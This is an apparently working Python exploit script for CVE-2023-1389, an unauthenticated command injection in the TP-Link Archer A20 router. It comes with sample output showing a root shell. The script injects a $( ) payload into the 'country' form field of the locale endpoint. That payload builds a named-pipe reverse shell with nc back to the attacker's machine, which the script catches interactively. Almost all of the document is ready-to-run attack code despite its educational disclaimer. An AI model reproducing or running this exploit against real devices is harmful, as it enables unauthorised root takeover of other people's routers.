# * Exploit Title:  archv0id.py TP-Link AC4000 Archer A20 - Unauthenticated Remote Command Injection (RCE)
# * Exploit Author: b1nv0id (Reid Downing)
# * Vendor:         TP-Link
# * CVE:            CVE-2023-1389
# * Hardware:       Archer A20 (EOL)
# * Reference:      https://www.tenable.com/security/research/tra-2023-11
# * This code uses the exec cmd inj vuln found in 2023 to obtain a root shell.
# * Tested in controlled lab on a router that i own and this code is for educational purposes only.
# * I do not condone illegal activity. Do not use this code on a router you do not own.
#
#gh0st@tacolabs:$ python3 archv0id.py
#[+] Trying to bind to :: on port 4444: Done
#[+] Waiting for connections on :::4444: Got connection from ::ffff:192.168.0.254 on port 46955
#[+] Started listener on port 4444...
#[+] Step 1: Setting country to US...
#[+] Opening connection to 192.168.0.254 on port 80: Done
#[+] Receiving all data: Done (358B)
#[*] Closed connection to 192.168.0.254 port 80
#[+] Step 2: Injecting reverse shell...
#[+] Opening connection to 192.168.0.254 on port 80: Done
#[+] Packet sent, waiting for shell...
#[+] Success! Dropping into interactive mode:
#[*] Closed connection to 192.168.0.254 port 80
#[*] Switching to interactive mode
#/bin/sh: can't access tty; job control turned off
#
#
#BusyBox v1.19.4 (2019-10-23 08:31:17 EDT) built-in shell (ash)
#Enter 'help' for a list of built-in commands.
#
#/www # $ id
#uid=0(root) gid=0(root)
#/www # $ uname -a
#Linux Archer_A20 4.1.27 #1 SMP PREEMPT Wed Oct 23 07:46:12 EDT 2019 aarch64 GNU/Linux
#/www # $  


from pwn import *
import urllib.parse

# config
router_ip = '192.168.0.254'
laptop_ip = '192.168.0.178'
shell_port = 4444

path = "/cgi-bin/luci/;stok=/locale?form=country"

def send_post(body_data, close_immediately=True):
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {router_ip}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body_data)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body_data}"
    )
    conn = remote(router_ip, 80)
    conn.send(request.encode('utf-8'))
    if close_immediately:
        conn.recvall(timeout=0.5)
        conn.close()
        return None
    return conn

# Start the local listener
listener = listen(shell_port)
print(f"[+] Started listener on port {shell_port}...")

try:
    # STEP 1: Set valid country
    print("[+] Step 1: Setting country to US...")
    send_post("operation=write&country=US")
    sleep(1)

    # STEP 2: Inject shell command inside the $( ) block
    print("[+] Step 2: Injecting reverse shell...")
    
    # We clear out old nc processes, execute the pipe in the background, and crucially, 
    # use "echo US" at the end. This ensures $(cmd) evaluates to "US", 
    # making the router path look like /tmp/merge/US/BR so it completes cleanly.
    rev_shell_cmd = f"killall nc;rm -f /tmp/f4;mknod /tmp/f4 p;(cat /tmp/f4|/bin/sh -i 2>&1|nc {laptop_ip} {shell_port} >/tmp/f4 &);echo US"
    
    payload = f"$({rev_shell_cmd})"
    encoded_body = f"operation=write&country=" + urllib.parse.quote(payload)

    # Send payload and keep the trigger socket briefly alive
    trigger_conn = send_post(encoded_body, close_immediately=False)
    print("[+] Packet sent, waiting for shell...")

    # STEP 3: Catch the shell
    client_conn = listener.wait_for_connection()
    print("[+] Success! Dropping into interactive mode:")
    
    if trigger_conn:
        trigger_conn.close()
        
    client_conn.interactive()

except Exception as e:
    print(f"[-] Execution failed: {e}")
finally:
    listener.close()
